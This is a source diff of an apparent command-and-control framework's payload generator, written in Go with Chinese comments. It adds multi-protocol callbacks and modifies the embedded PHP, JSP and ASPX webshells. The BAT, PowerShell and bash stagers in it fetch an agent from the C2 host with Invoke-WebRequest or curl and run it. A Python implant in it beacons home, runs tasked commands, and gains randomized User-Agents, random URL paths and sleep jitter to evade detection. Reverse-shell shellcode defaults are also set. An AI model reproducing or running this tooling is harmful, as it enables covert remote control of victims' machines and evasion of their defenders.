@@ -10,6 +10,7 @@ import (
 	"os/exec"
 	"path/filepath"
 	"runtime"
+	"strconv"
 	"strings"
 	"time"
 )
@@ -27,6 +28,7 @@ type GeneratePayloadRequest struct {
 	Arch          string `json:"arch"`       // amd64 / x86 / arm / mips
 	Format        string `json:"format"`     // exe / php / jsp / aspx / bat / ps1 / sh / python / shellcode
 	Type          string `json:"type"`       // 前端用 type 字段，与 format 同义
+	Protocol      string `json:"protocol"`   // 通信协议: http / https / websocket / tcp
 	Encryption    string `json:"encryption"` // none / aes-128-cbc / aes-256-cbc / xor / rc4 / chacha20
 	ObfLevel      string `json:"obf_level"`  // low / medium / high / extreme
 	Obfuscation   string `json:"obfuscation"` // 前端用 obfuscation 字段，与 obf_level 同义
@@ -74,10 +76,29 @@ func handleGeneratePayload(w http.ResponseWriter, r *http.Request, user tokenInf
 		return
 	}
 
-	// 从配置管理读取 host/port/protocol
+	// 从配置管理读取 host/port
+	// 注意: port 使用 agent 专用端口 client_listen_port（默认 8443），
+	// 与 web 管理端口（listen_port，默认 5000）分离，
+	// 避免 agent 回连流量与 web 管理流量混在同一端口
 	host := getCallbackHost()
-	port := getListenPort()
-	protocol := getListenProtocol()
+	// 通信协议: 优先用前端选择的协议，为空时回退到配置管理的 agent_protocol
+	// 支持的协议: http / https / websocket / tcp
+	protocol := req.Protocol
+	if protocol == "" {
+		protocol = getAgentProtocol()
+	}
+	// https 需要 SSL 证书，如果配置了 https 但没有证书，回退到 http
+	if protocol == "https" {
+		if getSSLCert() == "" || getSSLKey() == "" {
+			protocol = "http"
+		}
+	}
+	// 根据协议选择端口: TCP 用 agent_tcp_port（默认 28443），其他用 client_listen_port（默认 8443）
+	// 这样 c2Server 字符串里的端口与实际连接端口一致，避免显示误导
+	port := getClientListenPort()
+	if protocol == "tcp" {
+		port = getAgentTCPPort()
+	}
 
 	// 加密参数: 请求指定 > 配置管理
 	encAlgo := req.Encryption
@@ -227,8 +248,10 @@ func generateGoAgent(platform, arch, host, port, protocol, encAlgo, encPassword,
 	// -buildid= 通过 ldflags 设置空 build ID（防止 Go 写入基于内容哈希的固定 ID）
 	// -trimpath 去除文件路径信息（避免泄露编译机器路径）
 	c2Server := fmt.Sprintf("%s://%s:%s", protocol, host, port)
-	ldflags := fmt.Sprintf("-buildid= -X 'main.C2Server=%s' -X 'main.EncAlgo=%s' -X 'main.EncPassword=%s'",
-		c2Server, encAlgo, encPassword)
+	// 通过 ldflags 注入通信协议和 TCP 端口（与 client-go config.go 包级变量对齐）
+	agentTcpPort := getSettingDefault("agent_tcp_port", "28443")
+	ldflags := fmt.Sprintf("-buildid= -X 'main.C2Server=%s' -X 'main.EncAlgo=%s' -X 'main.EncPassword=%s' -X 'main.Protocol=%s' -X 'main.AgentTCPPort=%s'",
+		c2Server, encAlgo, encPassword, protocol, agentTcpPort)
 	if goos == "windows" {
 		ldflags = "-H windowsgui " + ldflags
 	}
@@ -384,11 +407,12 @@ function sysinfo() {
 
 $algo = $ENC_ALGO;
 $raw_input = file_get_contents('php://input');
-
+// 纯密文协议: body 是 base64(IV+密文)，算法用硬编码 ENC_ALGO
 if ($algo && $algo !== 'none') {
     $decrypted = _enc_decrypt($raw_input, $algo);
     $req = json_decode($decrypted, true);
 } else {
+    // none 模式: base64(JSON) 或直接 JSON
     $req = json_decode($raw_input, true);
     if (!$req) {
         $req = json_decode(base64_decode($raw_input), true);
@@ -471,15 +495,9 @@ switch ($action) {
 }
 
 $response = json_encode(array('status' => $status, 'result' => $result));
-if ($algo && $algo !== 'none') {
-    $encrypted = _enc_encrypt($response, $algo);
-    header("Content-Type: text/plain");
-    header("X-Enc-Algo: $algo");
-    echo $encrypted;
-} else {
-    header("Content-Type: application/json; charset=utf-8");
-    echo $response;
-}
+$encrypted = _enc_encrypt($response, $algo);
+header("Content-Type: application/json; charset=utf-8");
+echo $encrypted;
 ?>`, encPassword, encAlgo)
 
 	return obfuscate(phpCode, "php", obfLevel)
@@ -707,7 +725,17 @@ func genJSPWebshell(host, port, protocol, encAlgo, encPassword, obfLevel string)
 <%%
     String algo = ENC_ALGO;
     String rawInput = request.getReader().lines().reduce("", (a, b) -> a + b);
-    String decrypted = decrypt(rawInput, algo);
+    // 纯密文协议: body 是 base64(IV+密文)，算法用硬编码 ENC_ALGO
+    String decrypted;
+    if (algo != null && !algo.equals("none") && !algo.isEmpty()) {
+        decrypted = decrypt(rawInput, algo);
+    } else {
+        // none 模式: base64(JSON) 或直接 JSON
+        decrypted = rawInput;
+        if (jsonGet(decrypted, "action") == null) {
+            decrypted = decrypt(rawInput, "none");
+        }
+    }
     if (decrypted == null) {
         response.setStatus(404);
         out.println("404 Not Found");
@@ -860,14 +888,9 @@ func genJSPWebshell(host, port, protocol, encAlgo, encPassword, obfLevel string)
     }
 
     String respJson = "{\"status\":\"" + status + "\",\"result\":\"" + jsonEscape(result) + "\"}";
-    if (algo != null && !algo.equals("none") && !algo.isEmpty()) {
-        response.setHeader("X-Enc-Algo", algo);
-        response.setContentType("text/plain");
-        out.print(encrypt(respJson, algo));
-    } else {
-        response.setContentType("application/json; charset=utf-8");
-        out.print(respJson);
-    }
+    String encrypted = encrypt(respJson, algo);
+    response.setContentType("application/json; charset=utf-8");
+    out.print(encrypted);
 %%>`, encPassword, encAlgo)
 
 	return obfuscate(jspCode, "jsp", obfLevel)
@@ -1142,17 +1165,13 @@ func genASPXWebshell(host, port, protocol, encAlgo, encPassword, obfLevel string
         using (var sr = new StreamReader(Request.InputStream, Request.ContentEncoding))
             body = sr.ReadToEnd();
 
-        // 解析请求: base64(IV/nonce + ciphertext)
+        // 纯密文协议: body 是 base64(IV+密文)，算法用硬编码 ENC_ALGO
         string reqAlgo = ENC_ALGO;
-        string reqBody = body;
-        string headerAlgo = Request.Headers["X-Enc-Algo"];
-        if (!string.IsNullOrEmpty(headerAlgo)) reqAlgo = headerAlgo;
-
-        // none 模式直接 JSON
+        string reqBody;
         if (reqAlgo == "none" || string.IsNullOrEmpty(reqAlgo))
         {
-            // body 可能是 JSON 也可能是 base64
-            try { var tmp = System.Text.Json.JsonDocument.Parse(body); reqBody = body; }
+            // none 模式: base64(JSON) 或直接 JSON
+            try { using (var tmp = System.Text.Json.JsonDocument.Parse(body)) reqBody = body; }
             catch { reqBody = Encoding.UTF8.GetString(B64Dec(body)); }
         }
         else
@@ -1186,6 +1205,7 @@ func genASPXWebshell(host, port, protocol, encAlgo, encPassword, obfLevel string
         {
             respEnc = Encrypt(result, reqAlgo);
         }
+        Response.ContentType = "application/json; charset=utf-8";
         Response.Write(respEnc);
     }
 </script>
@@ -1201,66 +1221,60 @@ func genASPXWebshell(host, port, protocol, encAlgo, encPassword, obfLevel string
 
 func genBAT(host, port, protocol, encAlgo, encPassword string) string {
 	c2Server := fmt.Sprintf("%s://%s:%s", protocol, host, port)
+	agentTcpPort := getSettingDefault("agent_tcp_port", "28443")
 	return fmt.Sprintf(`@echo off
-REM C2 Agent Launcher (BAT)
-REM Server: %s
-REM Encryption: %s
-
 set C2_SERVER=%s
 set C2_ENC_ALGO=%s
 set C2_ENC_PASSWORD=%s
+set PROTOCOL=%s
+set AGENT_TCP_PORT=%s
 
-echo [*] Starting C2 Agent...
-echo [*] Server: %%C2_SERVER%%
-echo [*] Encryption: %%C2_ENC_ALGO%%
-
-powershell -Command "Invoke-WebRequest -Uri '%s/deliver/AUTO' -OutFile '%%TEMP%%\c2_agent.exe'; Start-Process '%%TEMP%%\c2_agent.exe' -ArgumentList '-server','%%C2_SERVER%%','-enc-algo','%%C2_ENC_ALGO%%','-enc-password','%%C2_ENC_PASSWORD%%'"
-`, c2Server, encAlgo, c2Server, encAlgo, encPassword, c2Server)
+powershell -Command "Invoke-WebRequest -Uri '%s/deliver/AUTO' -OutFile '%%TEMP%%\c2_agent.exe'; Start-Process '%%TEMP%%\c2_agent.exe' -ArgumentList '-server','%%C2_SERVER%%','-enc-algo','%%C2_ENC_ALGO%%','-enc-password','%%C2_ENC_PASSWORD%%','-protocol','%%PROTOCOL%%','-tcp-port','%%AGENT_TCP_PORT%%'"
+`, c2Server, encAlgo, encPassword, protocol, agentTcpPort, c2Server)
 }
 
 func genPS1(host, port, protocol, encAlgo, encPassword string) string {
 	c2Server := fmt.Sprintf("%s://%s:%s", protocol, host, port)
-	return fmt.Sprintf(`# C2 Agent Launcher (PowerShell)
-$C2_SERVER = "%s"
+	agentTcpPort := getSettingDefault("agent_tcp_port", "28443")
+	return fmt.Sprintf(`$C2_SERVER = "%s"
 $C2_ENC_ALGO = "%s"
 $C2_ENC_PASSWORD = "%s"
-
-Write-Host "[*] Starting C2 Agent..."
-Write-Host "[*] Server: $C2_SERVER"
-Write-Host "[*] Encryption: $C2_ENC_ALGO"
+$PROTOCOL = "%s"
+$AGENT_TCP_PORT = "%s"
 
 $agentPath = "$env:TEMP\c2_agent.exe"
 Invoke-WebRequest -Uri "%s/deliver/AUTO" -OutFile $agentPath
-Start-Process $agentPath -ArgumentList "-server","$C2_SERVER","-enc-algo","$C2_ENC_ALGO","-enc-password","$C2_ENC_PASSWORD"
-`, c2Server, encAlgo, encPassword, c2Server)
+Start-Process $agentPath -ArgumentList "-server","$C2_SERVER","-enc-algo","$C2_ENC_ALGO","-enc-password","$C2_ENC_PASSWORD","-protocol","$PROTOCOL","-tcp-port","$AGENT_TCP_PORT"
+`, c2Server, encAlgo, encPassword, protocol, agentTcpPort, c2Server)
 }
 
 func genShell(host, port, protocol, encAlgo, encPassword string) string {
 	c2Server := fmt.Sprintf("%s://%s:%s", protocol, host, port)
+	agentTcpPort := getSettingDefault("agent_tcp_port", "28443")
 	return fmt.Sprintf(`#!/bin/bash
-# C2 Agent Launcher (Shell)
 export C2_SERVER="%s"
 export C2_ENC_ALGO="%s"
 export C2_ENC_PASSWORD="%s"
-
-echo "[*] Starting C2 Agent..."
-echo "[*] Server: $C2_SERVER"
-echo "[*] Encryption: $C2_ENC_ALGO"
+export PROTOCOL="%s"
+export AGENT_TCP_PORT="%s"
 
 curl -sL "%s/deliver/AUTO" -o /tmp/c2_agent
 chmod +x /tmp/c2_agent
-/tmp/c2_agent -server "$C2_SERVER" -enc-algo "$C2_ENC_ALGO" -enc-password "$C2_ENC_PASSWORD" &
-`, c2Server, encAlgo, encPassword, c2Server)
+/tmp/c2_agent -server "$C2_SERVER" -enc-algo "$C2_ENC_ALGO" -enc-password "$C2_ENC_PASSWORD" -protocol "$PROTOCOL" -tcp-port "$AGENT_TCP_PORT" &
+`, c2Server, encAlgo, encPassword, protocol, agentTcpPort, c2Server)
 }
 
 // ============ Python Agent 生成（精简版，与 payload_gen.py gen_python 对齐）============
 
 func genPythonAgent(host, port, protocol, encAlgo, encPassword, obfLevel string) string {
 	c2Server := fmt.Sprintf("%s://%s:%s", protocol, host, port)
-	pyCode := fmt.Sprintf(`import os,sys,json,time,base64,uuid,platform,subprocess,hashlib,socket
+	agentTcpPort := getSettingDefault("agent_tcp_port", "28443")
+	pyCode := fmt.Sprintf(`import os,sys,json,time,base64,uuid,platform,subprocess,hashlib,socket,random
 C2_SERVER="%s"
 ENC_ALGO="%s"
 ENC_PASSWORD="%s"
+PROTOCOL="%s"
+AGENT_TCP_PORT="%s"
 CLIENT_ID=hashlib.md5(str(uuid.getnode()).encode()).hexdigest()[:16]
 # 加密层（与服务端 crypto_utils.py 对齐）
 def _dk(n):
@@ -1311,19 +1325,76 @@ def _dec(d,a):
  elif a=='chacha20':return _cd(d)
  return d
 def info():return{"client_id":CLIENT_ID,"hostname":platform.node(),"os":platform.system(),"os_version":platform.version(),"arch":platform.machine(),"username":os.environ.get("USERNAME")or os.environ.get("USER","unknown")}
-def post(path,data):
- import requests
- b,a=_enc(data,ENC_ALGO);h={'Content-Type':'text/plain','X-Enc-Algo':a}
+def _http_send(op,data):
+ import requests,random
+ if isinstance(data,dict):data['_op']=op
+ b,a=_enc(data,ENC_ALGO)
+ h={'Content-Type':'text/plain;charset=UTF-8','User-Agent':random.choice(['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36','Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0']),'Accept':'text/plain, */*;q=0.8'}
+ p='/api/v1/'+''.join(random.choice('0123456789abcdef') for _ in range(16))
  try:
-  r=requests.post(C2_SERVER+path,data=b,headers=h,timeout=10);ra=r.headers.get('X-Enc-Algo','none').lower()or 'none'
-  if ra and ra!='none':return json.loads(_dec(r.text,ra))
-  try:return r.json()
-  except:return json.loads(_dec(r.text,'none')) if r.text else None
+  r=requests.post(C2_SERVER+p,data=b,headers=h,timeout=10)
+  t=r.text.strip()
+  if not t:return None
+  if t.startswith('{'):
+   try:
+    j=json.loads(t);ra=j.get('_a','none');rd=j.get('_d','')
+    if rd:return json.loads(_dec(rd,ra))
+    return j
+   except:pass
+  return json.loads(_dec(t,ENC_ALGO))
  except:return None
-def hb():return post("/agent/heartbeat",info())
+_ws_conn=[None]
+def _ws_connect():
+ import websocket,random
+ u=C2_SERVER.replace('https://','wss://').replace('http://','ws://')
+ u=u+'/ws/agent/'+''.join(random.choice('0123456789abcdef') for _ in range(16))
+ _ws_conn[0]=websocket.create_connection(u,timeout=10)
+def _ws_send(op,data):
+ if _ws_conn[0] is None:
+  try:_ws_connect()
+  except:_ws_conn[0]=None;return None
+ if isinstance(data,dict):data['_op']=op
+ b,a=_enc(data,ENC_ALGO)
+ try:
+  _ws_conn[0].send(b)
+  t=_ws_conn[0].recv()
+  return json.loads(_dec(t,ENC_ALGO)) if t else None
+ except:_ws_conn[0]=None;return None
+_tcp_sock=[None]
+def _tcp_connect():
+ import socket
+ h=C2_SERVER
+ if '://' in h:h=h.split('://')[1]
+ if ':' in h:h=h.split(':')[0]
+ _tcp_sock[0]=socket.create_connection((h,int(AGENT_TCP_PORT)),timeout=10)
+def _tcp_send(op,data):
+ import struct
+ if _tcp_sock[0] is None:
+  try:_tcp_connect()
+  except:_tcp_sock[0]=None;return None
+ if isinstance(data,dict):data['_op']=op
+ b,a=_enc(data,ENC_ALGO)
+ body=b.encode() if isinstance(b,str) else b
+ try:
+  _tcp_sock[0].sendall(struct.pack('>I',len(body))+body)
+  hdr=_tcp_sock[0].recv(4)
+  if len(hdr)<4:return None
+  ln=struct.unpack('>I',hdr)[0]
+  resp=b''
+  while len(resp)<ln:
+   chunk=_tcp_sock[0].recv(ln-len(resp))
+   if not chunk:break
+   resp+=chunk
+  return json.loads(_dec(resp.decode(),ENC_ALGO)) if resp else None
+ except:_tcp_sock[0]=None;return None
+def post(op,data):
+ if PROTOCOL=='websocket':return _ws_send(op,data)
+ elif PROTOCOL=='tcp':return _tcp_send(op,data)
+ else:return _http_send(op,data)
+def hb():return post("heartbeat",info())
 def pull():
- r=post("/agent/pull",{"client_id":CLIENT_ID});return r.get("tasks",[]) if r else []
-def res(tid,result,status="completed"):post("/agent/result",{"task_id":tid,"client_id":CLIENT_ID,"status":status,"result":result})
+ r=post("pull",{"client_id":CLIENT_ID});return r.get("tasks",[]) if r else []
+def res(tid,result,status="completed"):post("result",{"task_id":tid,"client_id":CLIENT_ID,"status":status,"result":result})
 def cmd(d):
  c=d.get("command","");s=d.get("shell","cmd")
  if platform.system()=="Windows":
@@ -1334,7 +1405,6 @@ def cmd(d):
  except Exception as e:return f"[ERROR] {e}"
 HANDLERS={"cmd":cmd,"sysinfo":lambda d:json.dumps(info())}
 if __name__=="__main__":
- print(f"[*] C2 Agent Started - ID: {CLIENT_ID}")
  while True:
   try:hb();ts=pull()
   except:ts=[]
@@ -1345,8 +1415,8 @@ if __name__=="__main__":
     try:r=h(td);res(tid,r)
     except Exception as e:res(tid,f"[ERROR] {e}","failed")
    else:res(tid,f"[ERROR] Unknown: {tt}","failed")
-  time.sleep(3)
-`, c2Server, encAlgo, encPassword)
+  time.sleep(10+random.randint(0,5))
+`, c2Server, encAlgo, encPassword, protocol, agentTcpPort)
 
 	return obfuscate(pyCode, "py", obfLevel)
 }
@@ -1389,8 +1459,22 @@ func handleGenerateShellcode(w http.ResponseWriter, r *http.Request, user tokenI
 		}
 	}
 
+	// LPORT/LHOST 默认值: 使用 shell_listen_port（shellcode reverse_tcp 回连到本 C2 的 TCP handler）
+	// shellcode 是 raw TCP 流量，必须连 shell_listen_port（默认 44330），不能连 HTTP 端口
+	shellPort := data.LPort
+	if shellPort == 0 {
+		shellPort, _ = strconv.Atoi(getShellListenPort())
+		if shellPort == 0 {
+			shellPort = 44330
+		}
+	}
+	shellHost := data.LHost
+	if shellHost == "" {
+		shellHost = getCallbackHost()
+	}
+
 	// 生成 shellcode 字节
-	shellcode := generateShellcodeBytes(payloadType, data.CustomCmd, data.TargetOS, data.LHost, data.LPort)
+	shellcode := generateShellcodeBytes(payloadType, data.CustomCmd, data.TargetOS, shellHost, shellPort)
 	if shellcode == nil {
 		jsonError(w, "不支持的 payload 类型: "+payloadType, http.StatusBadRequest)
 		return
